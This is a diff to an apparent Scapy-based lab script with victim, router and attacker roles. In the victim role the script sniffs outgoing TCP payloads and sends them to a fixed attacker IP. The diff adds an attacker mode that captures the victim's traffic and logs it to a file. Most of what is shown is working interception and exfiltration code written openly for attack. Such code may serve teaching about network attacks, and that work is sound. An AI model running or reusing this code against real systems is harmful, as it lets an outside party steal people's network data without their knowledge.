@@ -49,7 +49,6 @@ def send_to_attacker(packet):
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
-    data += ('|VICT_IP='+get_if_addr('eth1')).encode("utf-8")
     new_packet = IP(dst=attacker_ip)/TCP(dport=80)/Raw(load=data)
 
     send_to_router(new_packet)
@@ -115,6 +114,17 @@ def get_packet_destination(data):
 
 #---
 
+#Attacker functions
+#---
+
+def log_packet(packet):
+    f = open('log_file.txt', 'a')
+    f.write(packet.show())
+    f.write('\n')
+    f.close()
+
+#---
+
 
 if __name__=='__main__':
     local_ip = get_if_addr('eth1')
@@ -122,4 +132,6 @@ if __name__=='__main__':
         packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
     elif(role == 'router'):
         packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
+    elif(role == 'attacker'):
+        packet_sniffer('src host ' + victim_ip + ' and tcp', log_packet)
     
